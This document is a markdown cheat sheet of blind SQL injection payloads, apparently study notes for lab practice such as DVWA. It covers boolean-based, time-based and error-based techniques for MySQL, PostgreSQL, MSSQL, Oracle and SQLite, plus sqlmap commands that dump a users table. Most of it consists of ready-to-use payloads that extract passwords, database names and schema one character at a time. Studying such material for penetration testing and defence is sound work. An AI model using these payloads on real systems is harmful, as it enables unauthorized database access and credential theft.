## Boolean SQL Injection
- enter ID: 
```sql

## using AND, OR
ID = 1 --> User ID exists in the database.
ID = 10 --> User ID is MISSING from the database.

## payload
1' AND 1=1 # 
# User ID exists in the database.

1' AND 1=2 #
# User ID is MISSING from the database.

# current database user
' OR SUBSTRING(user(),1,1)='a'-- -

## Extract each character
' AND SUBSTRING(password,1,1)='a'-- -
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -

## ASCII brute force
' AND ASCII(SUBSTRING(password,1,1)) > 100 -- -
' AND ASCII(SUBSTRING(password,1,1)) = 97 -- -

## check if data exists check if data exists
' AND (SELECT COUNT(*) FROM users) > 0 -- -
' AND EXISTS(SELECT 1 FROM users) -- -

## Check table / schema
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 -- -
' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' -- -

## ## MySQL version:
' AND SUBSTRING(@@version,1,1)='8' -- -

## current database
' AND DATABASE()='security' -- -

## using sqlmap:
sqlmap -r req.txt -p id --dbs --string="User ID exists in the database."
sqlmap -r req.txt -p id --dbs -D dvwa --tables --string="User ID exists in the database."
sqlmap -r req.txt -p id --dbs -D dvwa -T users --dump --string="User ID exists in the database."

# --string="User ID exists in the database.": in case the statement is true



```

---

### Dump DBMS

- Mysql
```bash
1' AND @@version LIKE '%MySQL%' -- -
1' AND database() IS NOT NULL -- -
' AND LENGTH(database()) > 0 -- -

```

- PostgreSQL
```bash
1' AND version() LIKE '%PostgreSQL%' -- -
1' AND current_database() IS NOT NULL -- -
' AND LENGTH(current_database()) > 0 -- -
```

- Microsoft SQL Server
```bash
1' AND @@version LIKE '%Microsoft%' -- -
1' AND @@version IS NOT NULL -- -

```

- Oracle
```bash
1' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%' -- -
1' AND (SELECT 1 FROM dual) IS NOT NULL -- -
' AND LENGTH((SELECT table_name FROM all_tables WHERE ROWNUM=1))>0 -- -
```

---

## Time-Based SQL Injection
 - <font color="#ffc000">Syntax: </font> `IF(condition, true_statement, false_statement)`

```mysql
-- Mysql: SLEEP(), BENCHMARK()
' AND IF(condition, SLEEP(5), 0)-- -
' AND (CASE WHEN condition THEN SLEEP(5) ELSE 0 END)-- -

-- MSSQL: WAITFOR DELAY
' IF condition WAITFOR DELAY '0:0:5'-- -

-- PostgreSQL: pg_sleep()
' AND CASE WHEN condition THEN pg_sleep(5) ELSE pg_sleep(0) END-- -


-- If correct, the response will be delayed by 5 seconds.
'OR IF(1=1, SLEEP(5), 0) -- -

-- EX: Enumerating Characters’ Length of Database Name
'OR IF(LENGTH((SELECT DATABASE())) = 4, SLEEP(5), 0) -- -

-- Enumerating Database Name:
' OR IF(ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) = ASCII('a'), SLEEP(5), 0) -- -

### In sqlmap, use --time-sec


```

---

## Error
- Core payload pattern: `SELECT CASE WHEN (condition) THEN 1 ELSE (ERROR) END`

```sql

' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual ) = 'a' -- -
-- error -> true

' AND (SELECT CASE WHEN LENGTH(password) > 1 THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' -- 

' AND (SELECT CASE WHEN SUBSTR(password,1,1)='s' THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator' ) = 'a' -- -  

```

- Mysql

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((condition),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--

## Example extract DB name (char by char)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(IF(SUBSTRING(database(),1,1)='a',1,0),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--

```

- PostgreSQL

```sql
' AND (SELECT CASE WHEN (condition) THEN 1/0 ELSE 1 END)--

## EX:
' AND (SELECT CASE WHEN substring(current_database(),1,1)='a' THEN 1/0 ELSE 1 END)--
```

- MSSQL

```sql
' AND 1=CONVERT(int, (SELECT CASE WHEN (condition) THEN 'a' ELSE '1' END))--
--> ‘a’ → error  
-->‘1’ → OK

##EX:
' AND 1=CONVERT(int,(SELECT CASE WHEN SUBSTRING(DB_NAME(),1,1)='a' THEN 'a' ELSE '1' END))--

```

- Oracle(TO_CHAR/TO_NUMBER)

```sql
' AND (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--

EX:
' AND (SELECT CASE WHEN SUBSTR((SELECT name FROM v$database),1,1)='A' THEN TO_CHAR(1/0) ELSE '1' END FROM dual)--
```

- SQLite

```sql
' AND CASE WHEN (condition) THEN 1/0 ELSE 1 END--
```
## Tip
### Using binary search
- All **printable ASCII** : `low = 32, high = 126`
- identify the character type

| Type    | ASCII<br> |
| ------- | --------- |
| digit   | 48-57     |
| upper   | 65-90     |
| lower   | 97-122    |
| special | 33-47     |
